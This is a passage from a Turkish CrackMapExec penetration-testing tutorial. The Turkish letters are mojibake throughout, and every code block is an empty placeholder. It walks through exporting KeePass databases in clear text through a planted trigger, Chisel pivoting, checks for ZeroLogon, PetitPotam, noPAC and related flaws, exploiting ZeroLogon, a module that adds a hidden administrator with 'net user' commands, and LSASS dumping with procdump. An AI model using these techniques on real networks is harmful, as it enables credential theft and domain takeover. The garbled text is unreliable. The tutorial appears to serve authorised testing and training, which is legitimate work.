Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

{{CODE_BLOCK_208}}

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_214}}

Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

{{CODE_BLOCK_215}}


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

{{CODE_BLOCK_217}}


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_218}}


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_220}}


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_221}}


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_225}}


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

